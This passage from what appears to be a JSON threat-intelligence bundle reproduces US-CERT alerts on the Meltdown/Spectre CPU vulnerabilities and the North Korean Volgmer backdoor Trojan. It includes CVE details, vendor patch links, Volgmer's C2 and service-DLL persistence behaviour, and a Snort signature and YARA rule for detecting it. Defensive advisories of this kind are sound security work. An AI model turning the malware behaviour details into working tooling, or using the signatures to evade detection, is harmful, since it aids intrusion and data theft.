href=\"https://www.qubes-os.org/news/2018/01/04/xsa-254-meltdown-spectre/\">Qubes</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://access.redhat.com/security/security-updates/#/security-advisories?q=&amp;p=1&amp;sort=portal_publication_date%20desc&amp;rows=10&amp;documentKind=PortalProduct\">Red Hat</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.suse.com/pipermail/sle-security-updates/2018-January/date.html\">SuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.synology.com/en-us/support/security/Synology_SA_18_01\">Synology</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://success.trendmicro.com/solution/1119183-important-information-for-trend-micro-solutions-and-microsoft-january-2018-security-updates\">Trend Micro</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SpectreAndMeltdown\">Ubuntu</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.vmware.com/security/advisories/VMSA-2018-0007.html\">VMware</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://xenbits.xen.org/xsa/advisory-254.html\">Xen</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr></thead></table><p> </p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://meltdownattack.com/\">Graz University of Technology Meltdown website</a></li>\n            \t\t    \t<li><a href=\"https://spectreattack.com/\">Graz University of Technology Spectre website</a></li>\n            \t\t    \t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">Rogue Data Cache Load: CVE-2017-5754</a></li>\n            \t\t    \t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">Bounds Check Bypass: CVE-2017-5753</a></li>\n            \t\t    \t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">Branch Target Injection: CVE-2017-5715</a></li>\n            \t\t    \t<li><a href=\"https://www.kb.cert.org/vuls/id/584653\">CERT/CC’s Vulnerability Note VU#584653</a></li>\n            \t\t    \t<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1038\">Windows Kernel Elevation of Privilege: CVE-2018-1038 (Total Meltdown) </a></li>\n            \t\t    \t<li><a href=\"http://blog.frizk.net/2018/03/total-meltdown.html?m=1\">Ulf Frisk on “Total Meltdown”</a></li>\n            \t\t    \t<li><a href=\"https://support.microsoft.com/en-us/help/4093118\">Microsoft’s April 2018 Monthly Rollup</a></li>\n            \t\t    \t<li><a href=\"https://www.kb.cert.org/vuls/id/277400\">CERT/CC’s Vulnerability Note VU#277400</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>January 4, 2018: Initial version</li>\n\t\t    \t\t\t    \t<li>January 5, 2018: Updated vendor information links for Citrix, Mozilla, and IBM in the table and added links to Debian, Fedora Project, and Fortinet</li>\n\t\t    \t\t\t    \t<li>January 8, 2018: Added links to DragonflyBSD, Juniper, LLVM, NetApp, Qubes, and Synology</li>\n\t\t    \t\t\t    \t<li>January 9, 2018: Updated Solution Section</li>\n\t\t    \t\t\t    \t<li>January 10, 2018: Added links to Cisco and Nutanix</li>\n\t\t    \t\t\t    \t<li>January 17, 2018: Added note to Mitigation section and links to Oracle and Ubuntu</li>\n\t\t    \t\t\t    \t<li>January 18, 2018: Updated Description, Impact, and Solution Sections, and added an additional link</li>\n\t\t    \t\t\t    \t<li>January 19, 2018: Added link to HP</li>\n\t\t    \t\t\t    \t<li>January 31, 2018: Provided additional links and updated Description and Mitigation sections</li>\n\t\t    \t\t\t    \t<li>April 27, 2018: Added information and links regarding &quot;Total Meltdown&quot;</li>\n\t\t    \t\t\t    \t<li>May 1, 2018: Added information and link regarding Spectre Variant 2</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />",
			"external_references": [
				{
					"external_id": "10408 at https://www.us-cert.gov",
					"url": "https://www.us-cert.gov/ncas/alerts/TA18-004A",
					"source_name": "open source",
					"description": "Original release date: January 04, 2018 | Last revised: May 01, 2018<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>CPU hardware implementations</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>On January 3, 2018, the National Cybersecurity and Communications Integration Center (NCCIC) became aware of a set of security vulnerabilities—known as <a href=\"https://meltdownattack.com/\">Meltdown</a> and <a href=\"https://spectreattack.com/\">Spectre</a>—that affect modern computer processors. These vulnerabilities can be exploited to steal sensitive data present in a computer systems' memory.</p>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>CPU hardware implementations are vulnerable to side-channel attacks, referred to as Meltdown and Spectre. Meltdown is a bug that \"melts\" the security boundaries normally enforced by the hardware, affecting desktops, laptops, and cloud computers. Spectre is a flaw an attacker can exploit to force a program to reveal its data. The name derives from \"speculative execution\"—an optimization method a computer system performs to check whether it will work to prevent a delay when actually executed. Spectre affects almost all devices including desktops, laptops, cloud servers, and smartphones.</p><p>More details of these attacks can be found here:</p><ul><li>Common Vulnerability and Exposure (CVE):<ul><li>Rogue Data Cache Load: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">CVE-2017-5754</a> (Meltdown) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5754\">https://nvd.nist.gov/vuln/detail/CVE-2017-5754</a></li><li>Bounds Check Bypass: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">CVE-2017-5753</a> (Spectre) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5753\">https://nvd.nist.gov/vuln/detail/CVE-2017-5753</a></li><li>Branch Target Injection: <a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">CVE-2017-5715</a> (Spectre Variant 2) <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-5715\">https://nvd.nist.gov/vuln/detail/CVE-2017-5715</a></li></ul></li><li>CERT/CC’s Vulnerability Note <a href=\"https://www.kb.cert.org/vuls/id/584653\">VU#584653</a></li></ul>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>An attacker can gain access to the system by establishing command and control presence on a machine via malicious Javascript, malvertising, or phishing. Once successful, the attacker could escalate privileges to exploit Meltdown and Spectre vulnerabilities, revealing sensitive information from a computer’s kernel memory, including keystrokes, passwords, encryption keys, and other valuable information.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p><strong>Mitigation</strong></p><p>NCCIC encourages users and administrators to refer to their hardware and software vendors for the most recent information. In the case of Spectre, the vulnerability exists in CPU architecture rather than in software, and is not easily patched; however, this vulnerability is more difficult to exploit. </p><p>After patching, performance impacts may vary, depending on use cases. NCCIC recommends administrators ensure that performance is monitored for critical applications and services, and work with their vendor(s) and service provider(s) to mitigate the effect, if possible.</p><p>Additionally, NCCIC recommends users and administrators who rely on cloud infrastructure work with their CSP to mitigate and resolve any impacts resulting from host OS patching and mandatory rebooting.</p><p>For machines running Windows Server, a number of registry changes must be completed in addition to installation of the patches.  NCCIC recommends verifying your Windows Server version before downloading applicable patches and performing registry edits.  A list of registry changes can be found at <a href=\"https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution\">https://support.microsoft.com/en-us/help/4072698/windows-server-guidance-to-protect-against-the-speculative-execution</a>.</p><p>Microsoft has released guidance and an update that helps to mitigate against CVE-2017-5715 – the branch target injection vulnerability commonly known as Spectre Variant 2.  As always, NCCIC recommends testing patches before implemenation. More information can be found at <a href=\"https://support.microsoft.com/en-sg/help/4078407/update-to-enable-mitigation-against-spectre-variant-2\">https://support.microsoft.com/en-sg/help/4078407/update-to-enable-mitigation-against-spectre-variant-2</a>.</p><p><strong>Antivirus</strong></p><p>Typical antivirus programs are built on a signature management system, and may not be able to detect the vulnerabilities. NCCIC recommends checking with your antivirus vendor to confirm compatibility with Meltdown and Spectre patches. Microsoft recommends third-party antivirus vendors add a change to the registry key of the machine running the antivirus software. Without it, that machine will not receive any of the following fixes from Microsoft:</p><ul><li>Windows Update</li><li>Windows Server Update Services</li><li>System Center Configuration Manager </li></ul><p>More information can be found at <a href=\"https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software\">https://support.microsoft.com/en-us/help/4072699/january-3-2018-windows-security-updates-and-antivirus-software</a>.</p><p><strong>\"Total Meltdown\"</strong></p><p>Users running Windows 7 64-bit or Windows Server 2008 R2 64-bit operating systems on Intel processors who have installed Microsoft’s fix for Meltdown and Spectre in January or February of 2018 should install the latest patch immediately. According to researcher Ulf Frisk, the previous Microsoft patches for Meltdown and Spectre contain a vulnerability that could allow users and apps to read and write kernel memory, thereby gaining full control over a system.</p><p>Another researcher has posted code that takes advantage of this vulnerability, allowing a normal user to initiate an administrator-level command line session within the affected system.</p><p>Microsoft recommends users install the latest updates to mitigate this vulnerability.</p><p>The following resources provide additional information:</p><p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1038\">Windows Kernel Elevation of Privilege: CVE-2018-1038 (Total Meltdown)</a></p><p><a href=\"http://blog.frizk.net/2018/03/total-meltdown.html?m=1\">Ulf Frisk’s research</a></p><p><a href=\"https://support.microsoft.com/en-us/help/4093118\">Microsoft’s April 2018 Monthly Rollup</a></p><p><a href=\"https://www.kb.cert.org/vuls/id/277400\">CERT/CC’s Vulnerability Note VU#277400</a></p><p><strong>Vendor Links</strong></p><p>The following table contains links to advisories and patches published in response to the vulnerabilities. This table will be updated as information becomes available.</p><p>Note: NCCIC strongly recommends:</p><ul><li>downloading any patches or microcode directly from your vendor's website</li><li>using a test environment to verify each patch before implementing</li></ul><table border=\"1\" cellpadding=\"1\" cellspacing=\"1\" class=\"general-table\" style=\"width: 400px; height: 312px;\"><thead><tr><th scope=\"col\"><strong>Link to Vendor Information</strong></th><th scope=\"col\"><strong>Date Added</strong></th></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://aws.amazon.com/security/security-bulletins/AWS-2018-013/\">Amazon</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.amd.com/en/corporate/speculative-execution\">AMD</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://source.android.com/security/bulletin/2018-01-01\">Android</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.apple.com/en-us/HT208394\">Apple</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://developer.arm.com/support/security-update\">ARM</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.centos.org/pipermail/centos-announce/2018-January/date.html\">CentOS</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.chromium.org/Home/chromium-security/ssca\">Chromium</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180104-cpusidechannel \">Cisco</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.citrix.com/article/CTX231390\">Citrix</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-tracker.debian.org/tracker/CVE-2017-5754\">Debian</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.dragonflybsd.org/pipermail/users/2018-January/313758.html\">DragonflyBSD</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.f5.com/csp/article/K91229003\">F5</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fedoramagazine.org/protect-fedora-system-meltdown\">Fedora Project</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://fortiguard.com/psirt/FG-IR-18-002\">Fortinet</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://support.hp.com/document/c05869091\">HP</a></td><td scope=\"col\" style=\"text-align: left;\">January 19, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html\">Google</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.huawei.com/en/psirt/security-notices/huawei-sn-20180104-01-intel-en\">Huawei</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://securityintelligence.com/cpu-vulnerability-can-allow-attackers-to-read-privileged-kernel-memory-and-leak-data/\">IBM</a></td><td scope=\"col\" style=\"text-align: left;\">January 5, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;languageid=en-fr\">Intel</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://kb.juniper.net/InfoCenter/index?page=content&amp;id=JSA10842&amp;cat=SIRT_1&amp;actp=LIST\">Juniper</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://support.lenovo.com/us/en/solutions/len-18282\">Lenovo</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lkml.org/lkml/2017/12/4/709\">Linux</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.llvm.org/pipermail/llvm-commits/Week-of-Mon-20180101/513630.html\">LLVM: variant #2</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41760 %3chttps:/reviews.llvm.org/D41760%3e\">LLVM: builtin_load_no_speculate</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://reviews.llvm.org/D41761\">LLVM: llvm.nospeculatedload</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://azure.microsoft.com/en-us/blog/securing-azure-customers-from-cpu-vulnerability/\">Microsoft Azure</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV180002\">Microsoft</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack\">Mozilla</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://security.netapp.com/advisory/ntap-20180104-0001/\">NetApp</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://info.nutanix.com/TA5G00u0C000PVD00O0A8Q0\">Nutanix</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://nvidia.custhelp.com/app/answers/detail/a_id/4609\">NVIDIA</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://lists.opensuse.org/opensuse-security-announce/2018-01/msg00001.html\">OpenSuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html\">Oracle</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.qubes-os.org/news/2018/01/04/xsa-254-meltdown-spectre/\">Qubes</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://access.redhat.com/security/security-updates/#/security-advisories?q=&amp;p=1&amp;sort=portal_publication_date%20desc&amp;rows=10&amp;documentKind=PortalProduct\">Red Hat</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://lists.suse.com/pipermail/sle-security-updates/2018-January/date.html\">SuSE</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.synology.com/en-us/support/security/Synology_SA_18_01\">Synology</a></td><td scope=\"col\" style=\"text-align: left;\">January 8, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://success.trendmicro.com/solution/1119183-important-information-for-trend-micro-solutions-and-microsoft-january-2018-security-updates\">Trend Micro</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/SpectreAndMeltdown\">Ubuntu</a></td><td scope=\"col\" style=\"text-align: left;\">January 17, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"https://www.vmware.com/security/advisories/VMSA-2018-0007.html\">VMware</a></td><td scope=\"col\" style=\"text-align: left;\">January 10, 2018</td></tr><tr><td scope=\"col\" style=\"text-align: left;\"><a href=\"http://xenbits.xen.org/xsa/advisory-254.html\">Xen</a></td><td scope=\"col\" style=\"text-align: left;\">January 4, 2018</td></tr></thead></table><p> </p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://meltdownattack.com/\">Graz University of Technology Meltdown website</a></li>\n            \t\t    \t<li><a href=\"https://spectreattack.com/\">Graz University of Technology Spectre website</a></li>\n            \t\t    \t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754\">Rogue Data Cache Load: CVE-2017-5754</a></li>\n            \t\t    \t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753\">Bounds Check Bypass: CVE-2017-5753</a></li>\n            \t\t    \t<li><a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715\">Branch Target Injection: CVE-2017-5715</a></li>\n            \t\t    \t<li><a href=\"https://www.kb.cert.org/vuls/id/584653\">CERT/CC’s Vulnerability Note VU#584653</a></li>\n            \t\t    \t<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1038\">Windows Kernel Elevation of Privilege: CVE-2018-1038 (Total Meltdown) </a></li>\n            \t\t    \t<li><a href=\"http://blog.frizk.net/2018/03/total-meltdown.html?m=1\">Ulf Frisk on “Total Meltdown”</a></li>\n            \t\t    \t<li><a href=\"https://support.microsoft.com/en-us/help/4093118\">Microsoft’s April 2018 Monthly Rollup</a></li>\n            \t\t    \t<li><a href=\"https://www.kb.cert.org/vuls/id/277400\">CERT/CC’s Vulnerability Note VU#277400</a></li>\n            \t\t    </ul>\n\t\t    \n\t\t    <h3>Revision History</h3>\n\t\t    <ul>\n\t\t    \t\t    \t<li>January 4, 2018: Initial version</li>\n\t\t    \t\t\t    \t<li>January 5, 2018: Updated vendor information links for Citrix, Mozilla, and IBM in the table and added links to Debian, Fedora Project, and Fortinet</li>\n\t\t    \t\t\t    \t<li>January 8, 2018: Added links to DragonflyBSD, Juniper, LLVM, NetApp, Qubes, and Synology</li>\n\t\t    \t\t\t    \t<li>January 9, 2018: Updated Solution Section</li>\n\t\t    \t\t\t    \t<li>January 10, 2018: Added links to Cisco and Nutanix</li>\n\t\t    \t\t\t    \t<li>January 17, 2018: Added note to Mitigation section and links to Oracle and Ubuntu</li>\n\t\t    \t\t\t    \t<li>January 18, 2018: Updated Description, Impact, and Solution Sections, and added an additional link</li>\n\t\t    \t\t\t    \t<li>January 19, 2018: Added link to HP</li>\n\t\t    \t\t\t    \t<li>January 31, 2018: Provided additional links and updated Description and Mitigation sections</li>\n\t\t    \t\t\t    \t<li>April 27, 2018: Added information and links regarding &quot;Total Meltdown&quot;</li>\n\t\t    \t\t\t    \t<li>May 1, 2018: Added information and link regarding Spectre Variant 2</li>\n\t\t    \t\t\t    </ul>\n\t\t    <hr />\n\t\t    <p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t    <br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2018-01-04T18:47:21.000Z"
		},
		{
			"type": "report",
			"title": "TA17-318B: HIDDEN COBRA – North Korean Trojan: Volgmer",
			"name": "TA17-318B: HIDDEN COBRA – North Korean Trojan: Volgmer",
			"id": "report--c05a3bf7-e7aa-4842-bc21-0b4def5acce9",
			"description": "Original release date: November 14, 2017 | Last revised: November 22, 2017<br />\n\t\t    <h3>Systems Affected</h3>\n\t\t    <p>Network systems</p>\t\t    \n\t\t    <h3>Overview</h3>\n\t\t    <p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). Working with U.S. government partners, DHS and FBI identified Internet Protocol (IP) addresses and other indicators of compromise (IOCs) associated with a Trojan malware variant used by the North Korean government—commonly known as Volgmer. The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit <a href=\"https://www.us-cert.gov/hiddencobra\">https://www.us-cert.gov/hiddencobra</a>.</p><p>FBI has high confidence that HIDDEN COBRA actors are using the IP addresses—listed in this report’s IOC files—to maintain a presence on victims’ networks and to further network exploitation. DHS and FBI are distributing these IP addresses to enable network defense and reduce exposure to North Korean government malicious cyber activity.</p><p>This alert includes IOCs related to HIDDEN COBRA, IP addresses linked to systems infected with Volgmer malware, malware descriptions, and associated signatures. This alert also includes suggested response actions to the IOCs provided, recommended mitigation techniques, and information on reporting incidents. If users or administrators detect activity associated with the Volgmer malware, they should immediately flag it, report it to the DHS National Cybersecurity and Communications Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and give it the highest priority for enhanced mitigation.</p><p>For a downloadable copy of IOCs, see:</p><ul><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318B-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on five files associated with or identified as Volgmer malware and produced a Malware Analysis Report (MAR). MAR-10135536-D examines the tactics, techniques, and procedures observed. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_S508C.PDF\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-D_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t    \n\t\t    <h3>Description</h3>\n\t\t    <p>Volgmer is a backdoor Trojan designed to provide covert access to a compromised system. Since at least 2013, HIDDEN COBRA actors have been observed using Volgmer malware in the wild to target the government, financial, automotive, and media industries.</p><p>It is suspected that spear phishing is the primary delivery mechanism for Volgmer infections; however, HIDDEN COBRA actors use a suite of custom tools, some of which could also be used to initially compromise a system. Therefore, it is possible that additional HIDDEN COBRA malware may be present on network infrastructure compromised with Volgmer</p><p>The U.S. Government has analyzed Volgmer’s infrastructure and have identified it on systems using both dynamic and static IP addresses. At least 94 static IP addresses were identified, as well as dynamic IP addresses registered across various countries. The greatest concentrations of dynamic IPs addresses are identified below by approximate percentage:</p><ul><li>India (772 IPs) 25.4 percent</li><li>Iran (373 IPs) 12.3 percent</li><li>Pakistan (343 IPs) 11.3 percent</li><li>Saudi Arabia (182 IPs) 6 percent</li><li>Taiwan (169 IPs) 5.6 percent</li><li>Thailand (140 IPs) 4.6 percent</li><li>Sri Lanka (121 IPs) 4 percent</li><li>China (82 IPs, including Hong Kong (12)) 2.7 percent</li><li>Vietnam (80 IPs) 2.6 percent</li><li>Indonesia (68 IPs) 2.2 percent</li><li>Russia (68 IPs) 2.2 percent</li></ul><h3><strong>Technical Details</strong></h3><p>As a backdoor Trojan, Volgmer has several capabilities including: gathering system information, updating service registry keys, downloading and uploading files, executing commands, terminating processes, and listing directories. In one of the samples received for analysis, the US-CERT Code Analysis Team observed botnet controller functionality.</p><p>Volgmer payloads have been observed in 32-bit form as either executables or dynamic-link library (.dll) files. The malware uses a custom binary protocol to beacon back to the command and control (C2) server, often via TCP port 8080 or 8088, with some payloads implementing Secure Socket Layer (SSL) encryption to obfuscate communications.</p><p>Malicious actors commonly maintain persistence on a victim’s system by installing the malware-as-a-service. Volgmer queries the system and randomly selects a service in which to install a copy of itself. The malware then overwrites the ServiceDLL entry in the selected service's registry entry. In some cases, HIDDEN COBRA actors give the created service a pseudo-random name that may be composed of various hardcoded words.</p><h3><strong>Detection and Response</strong></h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to Volgmer. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malformed_UA\"; content:\"User-Agent: Mozillar/\"; depth:500; sid:99999999;)</code></p><p>___________________________________________________________________________________________________</p><h4>YARA Rules</h4><p><code>rule volgmer<br />{<br />meta:<br />    description = \"Malformed User Agent\"<br />strings:<br />    $s = \"Mozillar/\"<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $s<br />}</code></p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing 